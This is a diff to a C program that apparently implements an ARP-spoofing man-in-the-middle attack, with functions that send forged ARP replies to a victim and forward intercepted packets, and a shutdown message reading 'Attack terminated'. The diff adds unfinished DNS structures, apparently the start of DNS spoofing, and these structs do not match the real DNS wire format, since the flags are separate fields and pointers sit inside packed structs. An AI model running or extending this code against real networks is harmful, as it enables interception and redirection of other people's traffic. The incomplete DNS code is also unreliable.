@@ -14,11 +14,23 @@
 #include <net/ethernet.h>
 #include <netinet/if_ether.h>
 #include <netinet/ether.h>
+#include <linux/if_arp.h>
 #include <pthread.h>
 #include <time.h>
 #include <fcntl.h>
 #include <errno.h>
 #include <ctype.h>
+
+#define DNS_PORT 53
+#define DNS_HEADER_SIZE 12
+
+#define DNS_QUERY 0
+#define DNS_ANSWER 1
+#define DNS_TYPE_A 1
+
+#define PACKET_BUFFER_SIZE 65535
+#define HTTP_BUFFER_SIZE 8192
+#define MAX_URL_LENGTH 2048
 
 #define ARP_REQUEST 1
 #define ARP_REPLY 2
@@ -64,6 +76,45 @@ typedef struct arp_packet {
     ethernet_header eth;
     arp_header arp;
 } __attribute__((packed)) arp_packet;
+
+
+// workin on them currently
+typedef struct dns_header {
+    unsigned short id;
+    unsigned short qr;
+    unsigned short opcode;
+    unsigned short aa;
+    unsigned short tc;
+    unsigned short rd;
+    unsigned short ra;
+    unsigned short z;
+    unsigned short rcode;
+    unsigned short qdcount;
+    unsigned short ancount;
+    unsigned short nscount;
+    unsigned short arcount;
+} __attribute__((packed)) dns_header;
+
+typedef struct dns_question {
+    unsigned short qtype; // shoud be 1 here since we need only A records
+    unsigned short qclass;
+    unsigned char* qname; // can be of variable length
+} __attribute__((packed)) dns_question;
+
+typedef struct dns_answer {
+    unsigned short atype;
+    unsigned short aclass;
+    unsigned int ttl;
+    unsigned short rdlength;
+    unsigned char *rdata;
+    unsigned char *aname;
+} __attribute__((packed)) dns_answer;
+
+typedef struct dns_packet {
+    dns_header header;
+    dns_question question;
+   dns_answer answer;
+} dns_packet;
 
 void handle_sigint(int sig) {
     printf("\n\nAttack terminated. Statistics:\n");
@@ -213,8 +264,7 @@ int get_mac_from_ip(int sock, const char *interface, const unsigned char *ip, un
     return -1;
 }
 
-void send_arp_spoof(int sock, const unsigned char *victim_mac, const unsigned char *victim_ip, 
-                    const unsigned char *spoof_ip) {
+void send_arp_spoof(int sock, const unsigned char *victim_mac, const unsigned char *victim_ip, const unsigned char *spoof_ip) {
     arp_packet spoof_packet;
     struct sockaddr_ll device;
     
@@ -242,8 +292,7 @@ void send_arp_spoof(int sock, const unsigned char *victim_mac, const unsigned ch
     memcpy(spoof_packet.arp.target_mac, victim_mac, 6);
     memcpy(spoof_packet.arp.target_ip, victim_ip, 4);
 
-    if (sendto(sock, &spoof_packet, sizeof(spoof_packet), 0, 
-               (struct sockaddr*)&device, sizeof(device)) < 0) {
+    if (sendto(sock, &spoof_packet, sizeof(spoof_packet), 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
         perror("sendto");
         return;
     }
@@ -251,8 +300,7 @@ void send_arp_spoof(int sock, const unsigned char *victim_mac, const unsigned ch
     packets_sent++;
 }
 
-void forward_packet(const unsigned char *buffer, int size,
-                    const unsigned char *src_mac, const unsigned char *dest_mac) {
+void forward_packet(const unsigned char *buffer, int size, const unsigned char *src_mac, const unsigned char *dest_mac) {
     struct sockaddr_ll device;
     ethernet_header *eth = (ethernet_header *)buffer;
     
@@ -348,6 +396,7 @@ void print_packet_details(const unsigned char *buffer, int size) {
             
             if (ntohs(udp->dest) == 53 || ntohs(udp->source) == 53) {
                 printf(" (DNS)");
+                
             } else if (ntohs(udp->dest) == 67 || ntohs(udp->dest) == 68) {
                 printf(" (DHCP)");
             }
